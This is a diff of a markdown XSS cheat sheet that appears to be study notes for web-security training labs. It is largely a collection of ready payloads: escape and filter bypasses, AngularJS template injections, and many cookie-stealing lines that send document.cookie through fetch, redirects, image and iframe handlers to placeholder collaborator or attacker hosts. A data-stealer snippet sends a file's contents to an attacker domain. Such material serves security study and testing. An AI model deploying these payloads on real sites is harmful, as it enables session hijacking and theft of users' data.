@@ -4,32 +4,23 @@
 - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
 - [POC-COOKIE-STEALER](#poc-cookie-stealer) 🧪
 - [SEARCH-SINK-AND-SOURCES](#sinks-and-sources) 🧪
-- [GENERIC & POC PAYLOADS](#generic-payloads-poc)
-- [COOKIE-STEALER](#cookie-stealer)
+- [GENERIC & POC PAYLOADS](#generic-payloads-poc) 
+- [COOKIE-STEALER](#cookie-stealer) 🍪
 - [DATA-STEALER](#data-stealer)
 - [BYPASS-RESTRICTIONS](#bypass-restrictions)
 - [BYPASS-CPS](#bypass-cps)
 - [SVG-TAGS](#svg-tags)
-- [CUSTOM-TAGS](#custom-tags)
 - [CANONICAL-TAGS](#canonical-tags)
-- [FIND TAGS AND EVENTS ALLOWED](#find-tags-and-events-allowed)
-- [ANGULAR JS](#angular-js)
-
-- [DOM-XSS-JQUERY-ONHASHCHANGE](#dom-xss-jquery-onhashchange)
-
-
 
 ## Walkthrough - Most Important Labs
 
 - [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md) 👀
-- [XSS Reflected - how to find tags and attributed blocked and WAF bypass + extra: customtags](tags-and-attributed-blockec-waf-bypass.md) 👀
+- [XSS Reflected - FIND tags, attributed and events allowed -  WAF bypass + extra: customtags](tags-and-attributed-blockec-waf-bypass.md) 👀
  
 - [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
 - [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md) 🔥
 - [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md) 🔥
 - [DOM XSS Reflected - eval() + json format without JSON.parse()](dom-xss-reflected-eval-json-escape.md)
-
-
 
 
 ## CHEATSHEET
@@ -79,7 +70,29 @@ javascript:alert(0)
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
 {{1+1}}
 
+```
 
+#### BYPASS-RESTRICTIONS
+```js
+// -> escape ' with \
+\'<script>alert(1)</script>
+
+// -> escape \ with other \ and escape ' with \
+\\'<script>alert(1)</script>
+
+// -> escape ' with \ + comment the rest of the js code with //
+\' - alert(1) //
+
+${alert(0)}
+
+// Escape bad implementation of replace() (only first occurrence) 
+</script><script>alert(1)</script>
+<><script>alert(1)</script>
+<><img src=1 onerror=alert(1)>
+
+http://foo?&apos;-alert(1)-&apos;
+// replace(<>)
+ 
 ```
 
 #### COOKIE-STEALER
@@ -89,15 +102,9 @@ fetch('https://<BURP-COLLAB>/?cookie='+btoa(document.cookie)
 
 document.location='https://<BURP-COLLAB>/?cookies='+btoa(document.cookie)
 
-${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
-
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
-
 <img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
-
 <img src=0 onerror="fetch('https://<IP>/?cookie='+btoa(document.cookie))">
-
-<iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>
 
 <iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>
 
@@ -106,6 +113,12 @@ ${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
 
 <svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>
 
+// JS template -> backsticks `` instead of double quotes ""
+${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
+
+// JQuery $ -> onhashchange
+<iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>
+<iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>
 
 
 // tags / atributtes blacklisted
@@ -113,9 +126,6 @@ ${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
   src="https://<IP>>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie))>"
   onload="this.style.width='100px' ">
 </iframe>
-
-
-
 
 // angularJS
 {{$on.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
@@ -127,6 +137,7 @@ ${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
 // eval() function it's a dangerous function that takes a string and execute it as javascript code
 // the server scape " with \ so scape with another \ close } and comment with comment with javascript comment (//)
 // adapt the payload in the exam depending of the parser
+
 \"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
 
 ```
@@ -157,7 +168,7 @@ function handleResponse() {
 </script>
 ```
 
- read /home/carlos/secret.txt
+read /home/carlos/secret.txt
 ```js
 // XSS -> <script src="http://<IP>/exploit"></script>
 
@@ -174,29 +185,10 @@ req2.open('GET', ,ourDomain +"/steal?data= + btoa(response) , false);
 req2.withCredentials = true;
 req2.send(response);
 ```
-
-#### BYPASS-RESTRICTIONS
-```js
-// -> escape ' with \
-\'<script>alert(1)</script>
-// -> escape \ with other \ and escape ' with \
-\\'<script>alert(1)</script>
-// -> escape ' with \ + comment the rest of the js code with //
-\' - alert(1) // 
-${alert(0)}
-// ->  
-</script><script>alert(1)</script>
-http://foo?&apos;-alert(1)-&apos;
-// replace(<>)
-<><img src=1 onerror=alert(1)>  
-
-```
-
 #### BYPASS-CPS
 ```js
 
 ```
-
 
 #### SVG-TAGS
 ```js
@@ -211,23 +203,6 @@ http://foo?&apos;-alert(1)-&apos;
 
 #### CANONICAL-TAGS
 ```js
-
-```
-
-
-#### CUSTOM-TAGS
-```js
-
-```
-
-#### FIND-TAGS-AND-EVENTS-ALLOWED
-
-
-
-
-#### ANGULAR-JS
-```js
-
 
 ```
 
@@ -287,10 +262,8 @@ setRequestHeader()
 
 ```
 
-
-#### DOM-XSS-JQUERY-ONHASHCHANGE
-
 ```html
 <iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>
 
 ```
+
